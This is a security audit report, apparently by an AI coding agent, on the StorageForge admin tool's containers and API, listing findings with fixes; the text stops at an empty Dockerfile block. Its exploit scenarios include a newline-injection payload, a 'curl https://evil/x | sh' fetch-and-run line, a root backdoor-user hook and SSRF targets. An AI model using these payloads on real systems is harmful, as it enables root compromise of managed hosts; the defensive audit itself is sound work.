---
title: StorageForge Security Audit — Containers & API
date: 2026-10-28
version_audited: 0.2.0 (working tree on master, uncommitted changes included)
auditor: Claude Code (static review + targeted local reproduction)
scope: [Dockerfile, docker-compose.yml, docker/entrypoint.sh, docker/init-secrets.sh, server.py, users.py, alerts.py, jobs.py, deploy.py, moves.py, changes.py, shares.py, tasks.py, keyinstall.py]
tags: [security, audit, docker, api, hardening]
related: ["[[security-parm]]", "[[deployments-design]]"]
---

# StorageForge Security Audit — 2026-10-28

> [!abstract] How to read this note
> Every finding says **why** it is insecure: what the code assumes, how an attacker breaks the assumption, and what it costs you. Every control marked ✅ also says **why** it holds up, so you know what not to undo during refactors. File references are relative to `storageforge-indexer/`.

> [!success] Remediation status (2026-10-28, same day)
> - **SF-01 fixed.** Hosts in move steps, change tasks and share mounts must be host names or addresses (`scriptkit.host_name`). Notes are flattened to one line. Every `#` header line in the move, change, Ansible, share and task scripts goes through `scriptkit.comments()`, which turns line breaks and terminal control characters into spaces. Tests: `ScriptHeaderTests`.
> - **SF-02 mitigated (owner's call: full power per account stays, by design).** Anything that runs commands on hosts now needs the password typed within the last 5 minutes: deploy start, job run/verify/pause/resume/cutover, restore, key install, scan-access grant, deploy access and adopt. The UI prompts for it and retries the request. Read-only job actions (dry run, log, snapshots) don't prompt. Roles and TOTP were not added.
> - **SF-03 fixed.** Sessions end 30 minutes after sign-in (was 12 h); each user can raise their own to 8 h in the header's Session menu (changing it needs the password). Sessions are also stored server-side (`web_sessions`, hashed ids): logout kills copied cookies, and `storageforge-index user signout <name>` ends every session of an account.
> - **SF-06 fixed for the LAN.** Compose now puts an unprivileged, read-only nginx with a self-signed certificate (`init-secrets.sh`) on port 8443. Plain HTTP stays on the compose network. The cookie is `Secure` and named `__Host-sf_session`, with HSTS. Deployed jobs pin that certificate (`/etc/storageforge/report-ca.pem`) when they report to an https report URL. Not intended for internet exposure.
> - **SF-04 fixed.** Alert URLs may not resolve to loopback, link-local (cloud metadata), unspecified, multicast or reserved addresses, checked at save and before each send. Private LAN ranges stay allowed, because a self-hosted ntfy is the normal case. Redirects are not followed. The test button reports only HTTP status codes or "could not deliver". A stored ntfy/Gotify token is dropped when its server's host changes. Residual: DNS rebinding between check and connect.
> - **SF-05 fixed.** Numeric query args are clamped (`arg_num`), and NaN/inf are rejected.
> - **SF-07 fixed.** The per-account limit is keyed on account + client /24 (or /64), with a 100/day per-account backstop. Limit hits are audited (`web.login.limited`).
> - **SF-08 fixed.** `/healthz` is `{"status"}` only, except for the in-container healthcheck and signed-in users. `Server: StorageForge` carries no version.
> - **SF-09 fixed.** The base image is pinned by digest. Dependencies are installed with `--require-hashes` from `docker/requirements*.lock`, generated with a 14-day `--exclude-newer` cutoff. The runtime image has no pip, ensurepip or setuptools. Trivy in CI is not set up (there is no CI).
> - **SF-10 fixed differently.** Secret files are `0640` with the owner's group, read by the containers through `group_add`, so other host users can't read them even if `secrets/` is loosened. `secrets/api_token` was **not** deleted: nothing in the code uses it, but whether anything outside does is the owner's call.
> - **SF-11 fixed.** Every subprocess (ssh, ssh-agent, local shells) gets the environment without `STORAGEFORGE_*`.
> - **SF-12 fixed (opt-in).** `docker/egress-firewall.sh` (root) limits traffic out of `sf0` to DNS, SSH and alert ports. The demo runs as its own compose project, with its own volumes, bridge and port, and the target sits on an `internal` network.
> - **SF-13.** Snapshot browse is now POST. Job reports record the sender's address and reject run times dated ahead. Accepted as-is: logout without a CSRF token (SameSite=Strict), library `ValueError` text in 400s (signed-in users only), `style-src-attr 'unsafe-inline'`.
> - **SF-02 roles / TOTP / separate signer: not done.** The owner considers full power per account inherent to this tool. The password re-check covers the command paths.
> - **Addendum (§6), same day:** a second pass over the on-host programs and a compromised host. **SF-14** (injection into job deploy scripts) and **SF-15** (job keys could read any file as root) are **fixed**. **SF-16** (host impersonation) and **SF-18** were **fixed** on 2026-10-29, then **SF-17**, **SF-20** (re-rated High: it leaked the first line of `/etc/shadow`) and **SF-21**. SF-19 and SF-22 are accepted.
> - **Second full audit (§7), 2026-10-29:** found and fixed **SF-23** (another root-script injection), **SF-24** (Jinja2 in generated Ansible), **SF-25** (setuid bits survive a restore) and **SF-26** (a host could exhaust StorageForge's memory). **SF-27** (keyless audit entries) is now reported. Two permanent tests guard the classes: a canary sweep over every script generator, and a route-coverage check.
> - Verified end to end on an isolated compose stack (TLS, pinned cert, `__Host-` cookie, re-auth, clamps, logout revocation, group-read secrets, no pip in the image). The full test suite passes in the Dockerfile `test` stage.

---

## 1. Executive Summary

### Overall risk posture: **Moderate — good container baseline, one confirmed injection bug, and a flat trust model with a large blast radius**

StorageForge is a single-tenant admin tool. Its web UI holds an SSH key vault and a **signing key that can run any script as root on every enrolled host**. So the real question is not "can user A read user B's data" (there are no per-user objects). It is: **how hard is it to become *any* signed-in user, or to slip a command into something a signed-in user will run as root?**

- **Container hardening is strong.** The container runs non-root with a read-only root filesystem, `cap_drop: ALL`, `no-new-privileges`, tmpfs runtime dirs, a loopback-only port, and file-based secrets. The entrypoint refuses to start as root. Only supply-chain pinning and some file-permission details are missing.
- **API authentication coverage is complete.** Every `/api/*` route except `/api/login`, `/api/logout`, `/healthz` and the bearer-token `/api/jobs/report` has `@login_required`. SQL is parameterized, and passwords use scrypt with timing-equal misses.

### High-severity issues

| ID | Title | Severity |
|---|---|---|
| [[#SF-01 — Shell injection into root scripts via newline in host / note fields\|SF-01]] | Newlines in a move step's host or note, or in a change task's host, become executable lines in generated root bash scripts. **Reproduced locally.** | 🔴 High |
| [[#SF-02 — Flat authorization: every account is root on every enrolled host\|SF-02]] | Every account has full power: deploys as root, pre/post hook commands, key install. There are no roles, no MFA, and no re-authentication before root-level actions. | 🔴 High |

### Immediate remediation roadmap

1. **Today:** validate `host` in `moves.normalize` and `changes.normalize` the same way `tasks.normalize` already does, and strip CR/LF from every value written into a `#` comment line (SF-01).
2. **This week:** clamp `limit` parameters (SF-05). Revoke sessions server-side on logout (SF-03). Block private and loopback targets for alert URLs (SF-04).
3. **Next release:** add re-authentication (and optional TOTP) before deploy/apply, key install and access grant. Add a read-only role (SF-02). Pin the base image digest and dependency hashes (SF-09).

---

## 2. Container Hardening Analysis

### 2.1 What is done right (keep these)

| Control | Where | ✅ Why it is secure |
|---|---|---|
| Non-root user `10001:10001` | `Dockerfile` `USER 10001:10001`; compose `user:` | A process exploited through Flask, waitress or ssh gets an unprivileged UID. It cannot write system paths or load kernel modules, and any container escape starts without root inside the container. Setting the user in **both** places means a compose override that drops one still leaves the other. |
| Entrypoint refuses root | `docker/entrypoint.sh` step 1 | A `docker run --user 0` mistake fails loudly instead of quietly running the vault as root. |
| `read_only: true` | compose | An attacker with code execution cannot drop a persistent binary, change `/opt/venv` Python files (backdooring the app on next start) or edit `/etc`. Writes are confined to the data volume and tmpfs mounts. |
| `cap_drop: [ALL]`, no `cap_add` | compose | The default Docker capability set includes `NET_RAW` (ARP/packet spoofing on the bridge), `CHOWN`, `DAC_OVERRIDE`, `SETUID` and others. The app needs none of them. With no capabilities, even a root shell inside the container can do very little. |
| `no-new-privileges:true` | compose | setuid binaries (and file capabilities) in the image cannot raise privileges. This closes the classic "exploit as app user → run a setuid helper" path. |
| tmpfs `/run/storageforge` (`noexec,nosuid,nodev,0700`) and `/tmp` | compose; entrypoint checks `fstype` | Decrypted SSH keys only exist in ssh-agent memory and its socket here. They never reach a disk that could be imaged or backed up. `noexec` stops payloads staged in writable dirs from being run directly. |
| Port published on `127.0.0.1` only | compose `ports` | Nothing outside the host can reach the plaintext HTTP listener. A TLS proxy is forced to be the only way in. |
| Compose `secrets:` and `*_FILE` variables | compose, `vault.py:152`, `server.py:129` | Secrets never appear in `docker inspect`, `/proc/<pid>/environ` or image layers, and are not inherited by child processes as environment variables. |
| Multi-stage build; pip removed from venv; `--no-install-recommends`; apt lists deleted | `Dockerfile` | Compilers, build caches and the venv's pip stay out of the runtime image. Fewer tools means less for an attacker to live off. |
| `ssh-keyscan`, `scp`, `sftp` deleted | `Dockerfile` | Removes easy file-transfer and reconnaissance tools that the app does not need. |
| `tini` as PID 1 | `Dockerfile` | Reaps zombie ssh/agent processes and forwards signals, so ephemeral agents with decrypted keys are not left behind as orphans. |
| `pids: 256`, memory/CPU limits, `nofile` ulimit | compose | Fork bombs and runaway scans hit a ceiling inside the cgroup instead of exhausting the host. |
| `.dockerignore` excludes `secrets/`, `keys/`, `*.db` | `.dockerignore` | A `docker build` cannot bake the vault secret or the database into an image layer that might get pushed to a registry. |
| No Docker socket mounted | compose | Mounting `/var/run/docker.sock` would equal host root. The Docker inventory feature collects data over SSH instead. |

### 2.2 Gaps

| Gap | Finding |
|---|---|
| Base image tag and Python deps not pinned to digests or hashes | [[#SF-09 — Unpinned base image and dependencies; system pip left in runtime\|SF-09]] |
| Secret files are `0644` on the host; stale `secrets/api_token` | [[#SF-10 — Host secret files world-readable (mitigated by 0700 dir); stale token file\|SF-10]] |
| ssh children inherit the full environment | [[#SF-11 — SSH subprocesses inherit the full process environment\|SF-11]] |
| Flat network with unrestricted egress; demo target shares it | [[#SF-12 — Unrestricted egress and a flat bridge network\|SF-12]] |
| `STORAGEFORGE_COOKIE_SECURE` defaults to `0` | [[#SF-06 — Secure cookie flag off by default; no HSTS\|SF-06]] |
| `memlock` ulimit raised | Intentional, so the vault can `mlock()` key buffers and keep them out of swap. **Why it's acceptable:** 16 MiB of locked memory per container cannot starve the host, and keeping keys out of swap is worth more. |

### 2.3 Volumes and mounts

| Mount | Mode | Assessment |
|---|---|---|
| `sf-data:/app/data` | rw | Required. The entrypoint enforces owner UID and `0700`/`0600` modes. **Why that matters:** the DB holds wrapped keys and the audit chain, and a world-readable DB would expose them to other UIDs inside the container. |
| `sf-backups:/app/backups` | rw | Backups contain the vault ciphertext. They are encrypted, but the README says to copy them off-host. Off-host copies should stay encrypted at rest too: the KEK comes only from `vault_secret`, so whoever holds a backup **and** that secret holds every key. |
| `/etc/localtime` | ro | Harmless. |
| `./keys:/run/secrets/ssh-import` | ro | **Why `:ro` matters:** the entrypoint imports every file here as a key. A writable mount would let a compromised container plant files for the next import. The entrypoint even probes and warns if it is writable. ✅ |

---

## 3. API Security Assessment

### 3.1 Authentication boundary

| Route | Auth | Assessment |
|---|---|---|
| `GET /`, `/planner`, static allow-list | none | ✅ Static files from a fixed `<any(...)>` allow-list. **Why it's safe:** no user-controlled path ever reaches `send_from_directory`, so traversal is impossible. |
| `GET /healthz` | none | ⚠️ Leaks user count and vault state — [[#SF-08 — Unauthenticated /healthz and Server header disclose internals\|SF-08]] |
| `POST /api/login` | none, rate-limited | ✅ / ⚠️ see [[#SF-07 — Per-username login limit enables targeted account lockout\|SF-07]] |
| `POST /api/logout` | none | ⚠️ does not revoke the cookie — [[#SF-03 — Logout does not revoke the session cookie\|SF-03]] |
| `POST /api/jobs/report` | Bearer job token | ✅ The token is 256-bit random (`secrets.token_urlsafe(32)`) and only its SHA-256 is stored (`jobs.py:336`). The token must match the `job` in the body (`server.py:977`), and the body is capped at 4 KiB. **Why it's secure:** a DB leak exposes no usable tokens, and a token cannot report for another job. |
| every other `/api/*` | `@login_required` | ✅ Checked route by route in `server.py:431-1097`. No route is missing the decorator. |

### 3.2 Object-level authorization (BOLA / IDOR)

StorageForge has **no per-user ownership**. Plans (`/api/moves/<id>`, `/api/changes/<id>`, `/api/tasks/<id>`), deployed jobs (`/api/deploy/jobs/<jid>`) and designs are global objects. Any signed-in user can read, edit, delete or deploy any of them.

- **Why this isn't a classic IDOR:** there is no ownership boundary to bypass. Integer IDs are fine because every user is meant to see every object.
- **Why it still matters:** the authorization model is "authenticated = full admin". Every BOLA question reduces to [[#SF-02 — Flat authorization: every account is root on every enrolled host|SF-02]]. If you ever add a second, less-trusted account (for example a viewer for a family member or colleague), you need roles first.
- ✅ Path parameters are typed or validated before use: `<int:plan_id>`, `JOB_RE` on job IDs (`jobs.py:406`), a 32-hex regex on group IDs (`server.py:908`), and a verb allow-list via `<any(...)>`. **Why this matters:** `jid` is interpolated into shell commands (`jobs.py:395-403`), and the regex is the only thing stopping injection there.

### 3.3 CSRF / CORS

- ✅ State-changing routes require `application/json` (`json_body()`, `server.py:366`), and **no CORS headers are ever sent**. **Why it's secure:** a cross-site page can only send "simple" requests (form-encoded, `text/plain`). A JSON content type or a `PUT`/`DELETE` method triggers a CORS preflight, which the browser fails. Independently, `SameSite=Strict` stops the browser from attaching `sf_session` to any cross-site request at all, so there are two layers.
- ℹ️ `DELETE /api/shares` reads only query args, but `DELETE` is never a simple method, so preflight still protects it.
- ℹ️ Some `GET`s have side effects: `/api/deploy/jobs/<jid>/browse` runs a signed command on a host, and the script downloads write audit entries. `SameSite=Strict` covers this, but GETs should be safe by convention. If cookies are ever relaxed to `Lax`, a top-level cross-site link would carry the cookie on these GETs.

### 3.4 Input validation

| Area | Status | Why |
|---|---|---|
| Body size | ✅ 4 KiB global, 2 MiB for planner `PUT` | Oversized-JSON memory exhaustion is bounded before parsing. |
| SQL | ✅ parameterized everywhere; `f"""` SQL interpolates only fixed fragments (sampled: `deploy.py:495`, `alerts.py:227`, `fsmap.py:129`, `db.py`) | User values never become SQL syntax. |
| Paths into scripts | ✅ `moves._path` rejects `..`, NUL, `\n`; values pass through `shlex.quote` into bash arrays | Quoting makes each value a single literal word, and newline rejection keeps the values on one line. |
| **Hosts and notes in moves and change plans** | ❌ not validated | → [[#SF-01 — Shell injection into root scripts via newline in host / note fields\|SF-01]] |
| Task host | ✅ `tasks.normalize` rejects non-hostnames (`tasks.py:221-223`, confirmed by test) | The pattern to copy for SF-01. |
| SSH target fields | ✅ `keyinstall.validate` (`HOST`, `USER` regexes, no leading `-`) | Blocks option injection such as `-oProxyCommand=…` into `ssh`/`ssh-copy-id` argv. |
| Pagination `limit` | ❌ negative values accepted | → [[#SF-05 — Negative limit bypasses result caps (full-table dumps / DoS)\|SF-05]] |
| Outbound URLs | ⚠️ scheme-only check | → [[#SF-04 — SSRF through alert channel URLs with an error oracle\|SF-04]] |
| Mass assignment | ✅ normalizers build new dicts field by field from allow-lists | Unknown keys in the body are dropped, so clients cannot set `id`, `created_by` and similar fields. |

### 3.5 Rate limiting

✅ Login is limited per IP (10/min, 50/h) and per username (5/min, 20/h), and only **failed** attempts count (`deduct_when=failed`). Key install, access grant and deploy access (each one is a password try against a *target host*) allow 10/min per user. Backups allow 6/h, and the test alert 10/min.
- **Why it's good:** an online password guess costs an attacker about 20 tries/hour/account, and successful sign-ins never lock a legitimate user out.
- **Caveats:** the limits live in `memory://`, so they reset on restart (fine for a single process). Per-username limits allow targeted lockout ([[#SF-07 — Per-username login limit enables targeted account lockout|SF-07]]). Behind a proxy you **must** set `STORAGEFORGE_PROXY_HOPS=1`. Otherwise every client shares the proxy's IP, and one attacker can trip the per-IP limit for everyone.

### 3.6 Flask session and error handling

| Item | Status | Why |
|---|---|---|
| `HttpOnly` | ✅ | JavaScript (including any XSS) cannot read `sf_session`, which blocks cookie theft through script. |
| `SameSite=Strict` | ✅ | See §3.3. |
| `Secure` | ⚠️ off by default | [[#SF-06 — Secure cookie flag off by default; no HSTS\|SF-06]] |
| Lifetime | ✅ 12 h absolute | Flask checks `max_age=PERMANENT_SESSION_LIFETIME` on every load, and non-permanent sessions are not re-signed per request. A stolen cookie therefore dies 12 h after login. |
| `session_protection='strong'` | ✅ | Flask-Login binds the session to a hash of IP and User-Agent. A cookie replayed from a different network is dropped. (Behind a proxy without `PROXY_HOPS`, every client has the same IP, which weakens this.) |
| Session fixation | ✅ N/A | Sessions are client-side signed cookies with no server-side ID to fix, and `login_user` writes a fresh identity. |
| Revocation | ⚠️ only on password change or disable (`session_version`) | [[#SF-03 — Logout does not revoke the session cookie\|SF-03]] |
| Debug / tracebacks | ✅ | The app is served by waitress, not `app.run(debug=True)`. Unhandled errors return only `internal error: <ExceptionType>` (`server.py:361`), with the traceback going to stderr. **Why it matters:** no file paths, SQL or locals reach the client. |
| Error text pass-through | ℹ️ | `ValueError`, `VaultError`, `RemoteError` and `InstallError` messages are returned verbatim. They are mostly authored strings. A `ValueError` raised deep inside a library would leak its message, but only to signed-in users. |
| Security headers | ✅ strict CSP (`script-src 'self'`, `frame-ancestors 'none'`, `base-uri 'none'`), `nosniff`, `no-referrer`, `DENY`, COOP, `no-store` | Without inline scripts, an HTML-injection bug cannot become script execution. `no-store` keeps API responses (keys, audit data) out of browser and proxy caches. `style-src-attr 'unsafe-inline'` is a small, accepted gap: style attributes allow CSS-only tricks, not script. |

---

## 4. Detailed Findings Register

### SF-01 — Shell injection into root scripts via newline in host / note fields

| | |
|---|---|
| **Severity** | 🔴 High |
| **Component** | `storageforge_index/moves.py:96-98, 420`; `storageforge_index/changes.py:121-123, 149, 564-565` |
| **Status** | **Confirmed** by local reproduction |

**Technical description.** The generated scripts quote every *value* with `shlex.quote` and put it in a bash array. The script header is different: it lists the plan as `#`-prefixed comment lines built by plain f-string interpolation:

```python
# moves.py:420
summary.append(f'#   {len(summary) + 1}. {vals["S_DESC"]}' + ... + (f'  [{s["note"]}]' if s['note'] else ''))
# changes.py:564
summary.append(f'#   {i:>2}. [{t["host"]}] {title(t)}' ...)
```

`S_DESC` includes `src.host` and `dst.host`. `normalize()` only `.strip()`s these and `note` (`moves.py:96-98`, `changes.py:121, 149`). It never rejects line breaks.

**Why this is insecure.** A comment only lasts until the end of its line. One `\n` inside the value ends the comment, and whatever follows is a **new bash command at the top of a script meant to run as root**. Quoting the values in the body does not help, because the header bypasses quoting entirely. The same text also reaches the "problems" comment block through check messages such as `source host … has not been scanned`.

Reproduction (scratch DB):

```text
note = "n\nid > /tmp/owned"
→ script line 1:  #   1. copy a:/srv -> b:/d  [n
→ script line 2:  id > /tmp/owned]          ← executed

change task host = "h1\nid > /tmp/owned2 #"
→ id > /tmp/owned2 #] Create folder /srv/new   ← executed
→ id > /tmp/owned2 # has not been scanned      ← executed again
```

**Exploit scenario.**
1. An attacker gets *any* web session (a phished password, a cookie from an unlocked laptop, or one of the other findings). Alternatively, a co-admin crafts the plan directly.
2. They edit an existing, trusted move plan and add a long note whose second line is `curl -s https://evil/x | sh`. The UI shows it as a harmless note.
3. The owner downloads the script, reads the first screen of the *body* (all values quoted), and runs it with `sudo bash plan.sh`. The payload runs as root before any step.

The downloaded script is a human-reviewed artifact, and this bug lets a payload hide in the part reviewers skim, which is what makes it worse than SF-02's "users can already add hooks". Any future feature that renders these headers into signed deploys inherits the bug.

**Remediation.**

```python
# moves.py — reuse the SSH host rule (keyinstall.HOST) like tasks.normalize already does
from .keyinstall import HOST as HOST_RE

def _host(h, what) -> str:
    h = str(h or '').strip()
    if not HOST_RE.fullmatch(h) or h.startswith('-'):
        raise ValueError(f'{what} must be a host name or address')
    return h

# in normalize():
'src': {'host': _host(src.get('host'), f'step {i} source host'), 'path': _path(...)},
'dst': {'host': _host(dst.get('host'), f'step {i} destination host'), 'path': _path(...)},
'note': ' '.join(str(s.get('note') or '').split())[:300],      # collapses \r \n \t
```

```python
# changes.py normalize()
host = _host(t.get('host'), f'task {i} host')                    # same helper
... 'note': ' '.join(str(t.get('note') or '').split())[:300]
```

Defense in depth: route **every** string written into a comment through one helper, so a future field cannot reintroduce the bug.

```python
def comment(text: str) -> str:
    return ' '.join(str(text).split())        # no CR/LF/VT/FF survives
summary.append(f'#   {n}. {comment(vals["S_DESC"])}' ...)
problems = [f'#   step {st["step"]}: {it["level"].upper()}: {comment(it["text"])}' ...]
```

Add a regression test that saves a plan with `'\n'` in host and note, and asserts `script()` contains no line that does not start with `#` before `set -euo pipefail`. Apply the same audit to `tasks.py:593-594` (block notes and labels) and `shares.py:402`.

---

### SF-02 — Flat authorization: every account is root on every enrolled host

| | |
|---|---|
| **Severity** | 🔴 High (by design, but the impact is the whole fleet) |
| **Component** | `server.py` (all routes), `deploy.py`, `moves.py:89-94` (pre/post hooks), `users.py` |

**Technical description.** There is one role. Any signed-in user can:
- `POST /api/deploy/start` with `mode: apply`. The server signs the script with the vault's `storageforge-signing` key, and every enrolled host runs it as root (`deploy.py` docstring).
- Save move steps with arbitrary `pre`/`post` shell commands (`moves.py:89-94`), which deployed jobs run as root on the host.
- Generate and install SSH keys, grant scan access with sudo, change alert destinations, and restore snapshots.

There is no MFA and no re-authentication before these actions.

**Why this is insecure.** The deploy design is careful: signatures, nonces, a 10-minute window, and a forced-command runner. That design makes sure **only StorageForge** can run root scripts on hosts. Who gets to tell StorageForge what to sign comes down to **one password and one cookie**. So the security of every enrolled host equals the security of the weakest account's password and of every browser that ever held a session. Defense in depth is missing at exactly the most valuable point. The signing key also lives in the same process as the web app, so any RCE in Flask or a dependency can sign arbitrary scripts too.

**Exploit scenario.** An admin signs in from a shared machine and walks away. Anyone at the keyboard (or any malware there) opens Deploy → Changes → apply, or adds a `post` hook `useradd -o -u0 backdoor…`, and owns every server within one deploy cycle. Nothing asks for the password again.

**Remediation.**
1. **Step-up re-authentication** for root-level actions: deploy `apply`, job `run`/`cutover`/`restore`, key generate/install, access/deploy grant, and alert settings. Require a recent password (or TOTP) check.

```python
REAUTH_WINDOW = 300
def recent_auth():
    if time.time() - session.get('auth_at', 0) > REAUTH_WINDOW:
        abort(403, description='confirm your password to continue')

@web.post('/api/reauth')
@login_required
@limiter.limit(LOGIN_LIMIT_PER_USER, key_func=lambda: f'reauth:{current_user.get_id()}')
def api_reauth():
    if not users.authenticate(conn(), current_user.username, str(json_body().get('password', ''))):
        return jsonify(error='wrong password'), 401
    session['auth_at'] = time.time()
    return jsonify(ok=True)
# login: session['auth_at'] = time.time()
# api_deploy_start (mode == 'apply'), api_key_*, api_access_grant, api_deploy_access, job actions, restore: recent_auth()
```

2. **Optional TOTP** (`pyotp`) per user. Enforce it when `deploy.ready()` is true for any host.
3. **Roles:** a `role` column (`viewer`, `planner`, `admin`) and a decorator `@requires('admin')` on deploy, key and access routes. Viewers get GETs only.
4. Longer term: move signing into a separate process (or onto a hardware key) and send it signing requests over a local socket, so web-tier RCE does not automatically mean signing-key access.

---

### SF-03 — Logout does not revoke the session cookie

| | |
|---|---|
| **Severity** | 🟠 Medium |
| **Component** | `server.py:426-429`, `users.py:28-41` |

**Technical description.** Sessions are Flask's client-side signed cookies. `logout_user()` only tells the browser to drop *its* copy. The server keeps no record of the session, and `users.load()` accepts any cookie whose `user_id:session_version` still matches. `session_version` only changes on password change or disable.

**Why this is insecure.** Logout gives a false sense of safety. A cookie copied before logout (by malware, a proxy log, a cookie-syncing extension, or an HTTP-only deployment sniffed on the LAN, see SF-06) **keeps working for up to 12 h** after the user clicks "Sign out". Given SF-02, that is 12 h of root-on-the-fleet.

**Exploit scenario.** An attacker grabs `sf_session` from an unencrypted Wi-Fi session. The admin notices something odd and signs out, assuming the attacker is cut off, but the replayed cookie still works.

**Remediation (simplest):** make logout invalidate every session of that user, which is acceptable for a small admin tool.

```python
@web.post('/api/logout')
@login_required
def api_logout():
    conn().execute('UPDATE users SET session_version = session_version + 1 WHERE user_id = :u',
                   {'u': current_user.user_id})
    core.audit(conn(), actor(), 'web.logout', 'ok', None, {})
    logout_user()
    return jsonify(ok=True)
```

Better: store a random per-login `sid` in a `web_sessions` table, put it in the cookie, check it in `load_user`, delete it on logout, and offer "sign out everywhere" plus an idle timeout (for example 30 min without activity, tracked in the row).

---

### SF-04 — SSRF through alert channel URLs with an error oracle

| | |
|---|---|
| **Severity** | 🟠 Medium |
| **Component** | `alerts.py:19, 47-62, 67-103`; `server.py:961-966` |

**Technical description.** `save_settings` only checks that ntfy/gotify/webhook URLs match `https?://…`. `_post()` uses `urllib.request.urlopen`, which **follows redirects** and resolves any host, including `127.0.0.1`, `169.254.169.254`, RFC 1918 addresses and the Docker bridge gateway. `POST /api/deploy/settings/test` returns the exception text for each channel (`out.append(f'webhook: {exc}')`).

**Why this is insecure.** The server can reach places the user's browser cannot: its own loopback, the Docker host, other containers, and the LAN behind the host firewall (`sf0` is explicitly allowed to reach host port 22). Error messages such as `Connection refused` versus `timed out` versus `HTTP Error 404` turn the test button into a **port scanner and service fingerprinter** for the internal network. The request body is attacker-influenced JSON, and the ntfy/gotify tokens ride along in headers. An attacker who points `gotify.url` at their own server while a token is stored also captures that token: the UI hides it (`'••••••'`), but the server still sends it.

**Exploit scenario.** With a session, the attacker sets the webhook to `http://172.18.0.1:2375/containers/create` (an exposed Docker API on the host) or loops through `http://10.0.0.x:port/`. They press "Send test" ten times a minute and read which ports answer. Or they swap the gotify URL to `https://attacker` and press test to receive `X-Gotify-Key`.

**Remediation.**

```python
import ipaddress, socket, urllib.request

class _NoRedirect(urllib.request.HTTPRedirectHandler):
    def redirect_request(self, *a, **k):
        return None
_opener = urllib.request.build_opener(_NoRedirect)

def _public(url: str):
    host = urllib.parse.urlsplit(url).hostname or ''
    for *_, sa in socket.getaddrinfo(host, None):
        ip = ipaddress.ip_address(sa[0])
        if ip.is_private or ip.is_loopback or ip.is_link_local or ip.is_reserved or ip.is_multicast:
            if not ALLOW_PRIVATE_ALERTS:   # env opt-in for self-hosted ntfy on the LAN
                raise ValueError('alert URLs must be public (set STORAGEFORGE_ALERTS_ALLOW_PRIVATE=1 for a LAN server)')

def _post(url, data, headers):
    _public(url)
    req = urllib.request.Request(url, data=data, headers={'User-Agent': 'StorageForge', **headers}, method='POST')
    with _opener.open(req, timeout=15) as r:
        r.read(1000)

# send(): report a generic reason instead of str(exc)
except Exception as exc:
    out.append(f'webhook: failed ({type(exc).__name__})')
```

Also: when a channel's URL **host** changes, clear its stored token unless a new one comes in the same request, so a token cannot be redirected to a new destination. Require re-auth on `PUT /api/deploy/settings` (SF-02).

---

### SF-05 — Negative `limit` bypasses result caps (full-table dumps / DoS)

| | |
|---|---|
| **Severity** | 🟠 Medium |
| **Component** | `server.py:469` (`/api/search`), `server.py:485` (`/api/audit`), `server.py:915` (`/api/deploy/runs`, no cap at all) |

**Technical description.** The caps are `min(int(x), 500)` and `min(int(x), 1000)`. `min(-1, 500)` is `-1`, and in SQLite `LIMIT -1` means **no limit**. `/api/deploy/runs` passes `int(limit)` straight through.

**Why this is insecure.** The caps exist because the index can hold millions of rows (the compose file mentions a 6M-file index that hit 1 GiB). One `GET /api/search?q=*&limit=-1` makes the server build and JSON-serialize every match in memory. That can hit the 2 GiB container limit and get the process OOM-killed. The OOM kill takes the scan worker with it and marks running jobs failed. It is an authenticated DoS, but cheap and repeatable. `/api/audit?limit=-1` also dumps the entire audit log in one response.

**Remediation.**

```python
def clamp(v, default, hi):
    try:
        return max(1, min(int(v or default), hi))
    except ValueError:
        raise ValueError('limit must be a number')

limit=clamp(q.get('limit'), 100, 500)                          # /api/search
limit = clamp(request.args.get('limit'), 100, 1000)            # /api/audit
deploy.history(conn(), host, clamp(request.args.get('limit'), 50, 500))
```

Also clamp `years` in `/api/folders/cold` with `math.isfinite`.

---

### SF-06 — Secure cookie flag off by default; no HSTS

| | |
|---|---|
| **Severity** | 🟠 Medium (deployment-dependent) |
| **Component** | `docker-compose.yml` (`STORAGEFORGE_COOKIE_SECURE:-0`), `server.py:313` |

**Why this is insecure.** Without `Secure`, the browser sends `sf_session` over plain `http://` too. If the reverse proxy also listens on port 80, or a user ever types `http://storageforge.lan`, the cookie crosses the network in cleartext before any redirect happens, and anyone on the LAN or Wi-Fi can replay it (made worse by SF-03). A default that needs a manual change to be safe will stay unsafe in some installs.

**Remediation.**
- Default `STORAGEFORGE_COOKIE_SECURE=1` in compose, and let local-only use opt out (`0`), rather than the other way round.
- Better: derive it from the request. With `ProxyFix(x_proto=1)`, set `SESSION_COOKIE_SECURE=True` and refuse to log in when `request.scheme != 'https'`, unless `remote_addr` is loopback.
- Name the cookie `__Host-sf_session`. Browsers then refuse to set it without `Secure` and `Path=/` and without a `Domain`, so a sibling subdomain cannot overwrite it.
- Send `Strict-Transport-Security: max-age=31536000` when the scheme is https (or document it for the proxy).

---

### SF-07 — Per-username login limit enables targeted account lockout

| | |
|---|---|
| **Severity** | 🟡 Low |
| **Component** | `server.py:123-124, 404-415` |

**Why this is insecure.** The per-username key (`user:<name>`) counts failures from **any** IP. Someone who knows or guesses `admin` can send 5 bad passwords a minute and keep the real admin locked out (429) indefinitely, during an incident, for example. The intent (slowing distributed guessing) is right. The side effect is a cheap denial of access.

**Remediation.** Key the per-user limit on `(username, client /24 or /64)`, or exempt clients that present a valid long-lived "known device" cookie set after a past successful login. Keep a looser global per-user limit (for example 100/day) as the distributed-guessing backstop. Alert on per-user limit hits.

---

### SF-08 — Unauthenticated `/healthz` and `Server` header disclose internals

| | |
|---|---|
| **Severity** | 🟡 Low |
| **Component** | `server.py:348, 389-402` |

**Why this is insecure.** `/healthz` tells anyone the exact version, whether the vault is initialised, and how many active users exist (`users: 1` says one account is worth brute-forcing; `users: 0` says the instance is fresh). The `Server: StorageForge/0.2.0` header repeats the version on every response. That lets an attacker match the instance against known bugs before authenticating.

**Remediation.** Return only `{"status": "ok"}` (and 503 on failure) to unauthenticated callers. Give the detailed checks only to signed-in users or to requests from `127.0.0.1` (the Docker `HEALTHCHECK` runs inside the container, so the CLI `healthcheck` can keep full detail). Drop the version from `Server`.

---

### SF-09 — Unpinned base image and dependencies; system pip left in runtime

| | |
|---|---|
| **Severity** | 🟡 Low |
| **Component** | `Dockerfile:5`, `pyproject.toml` dependencies |

**Why this is insecure.** `python:3.13-slim-bookworm` is a moving tag, and `flask>=3.1`-style ranges resolve to whatever is newest at build time. Two builds of the same commit can differ, and a compromised or buggy upstream release flows straight into an image that holds an SSH-key vault. The build also cannot be audited after the fact, because nothing records which versions went in. The base image's own `/usr/local/bin/pip` is still in the runtime stage (only the venv's pip is removed), which gives an attacker with code execution an installer.

**Remediation.**

```dockerfile
